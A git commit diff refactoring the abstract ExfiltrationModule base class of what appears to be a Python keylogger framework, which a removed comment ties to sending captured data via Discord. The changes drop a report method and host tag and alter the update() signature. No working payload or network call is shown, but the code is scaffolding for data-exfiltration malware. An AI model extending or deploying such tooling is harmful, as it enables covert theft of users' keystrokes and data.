7d5af30c402b227249a15b1e22e358a4c1baad8f
EONRaider <livewire_voodoo@protonmail.com>
2021-10-15 11:06:42 -0300

    Refactor ExfiltrationModule class
    - Removed report method
    - Removed tag instance attribute
    - Modified signature of update method
    - Changes to docstrings

--- src/modules/exfiltration/base.py
+++ src/modules/exfiltration/base.py
@@ -4,47 +4,23 @@
 __author__ = "EONRaider @ keybase.io/eonraider"
 
 import abc
-import platform
-from datetime import datetime
 
 from src.modules.exploitation.base import ExploitationModule
 
 
 class ExfiltrationModule(abc.ABC):
-    def __init__(self, module: ExploitationModule, tag: str):
+    def __init__(self, module: ExploitationModule):
         """Interface for the implementation of all exfiltrators.
 
         Args:
             module (ExploitationModule): Instance of ExploitationModule
-                to which the exfiltrator will attach itself as a
-                subscriber.
-            tag (str): A unique identifier for the current host.
-                Defaults to a string with a format similar to
-                'KeyLogger::Discord::hostname' if None.
+                to which the exfiltrator receive data by attaching
+                itself as a subscriber.
         """
-
         self.module = module
         self.module.register_exfiltrator(self)
-        self.tag = tag if tag is not None else \
-            f"{self.module.__class__.__name__}::" \
-            f"{self.__class__.__name__}::" \
-            f"{platform.node()}"
-
-    @property
-    def report(self) -> str:
-        """Get a report based on the data buffered by the
-        ExploitationModule as a string consisting of a tag, timestamp
-        and the data itself."""
-        timestamp = datetime.now().strftime("%m/%d/%Y %H:%M:%S")
-        header = f"[{self.tag}] @ {timestamp}"
-        '''The standard report is formatted as follows:
-        KeyLogger::Discord::hostname @ 10/16/2021 13:30:20 - my data'''
-        if self.module.has_data is True:
-            return f"{header} - {self.module.contents}"
-        return f"{header} - <NO DATA>"
 
     @abc.abstractmethod
-    def update(self, *args, **kwargs):
+    def update(self, message: str):
         """To be implemented with the logic specific to each
         exfiltration mechanism."""
-        ...
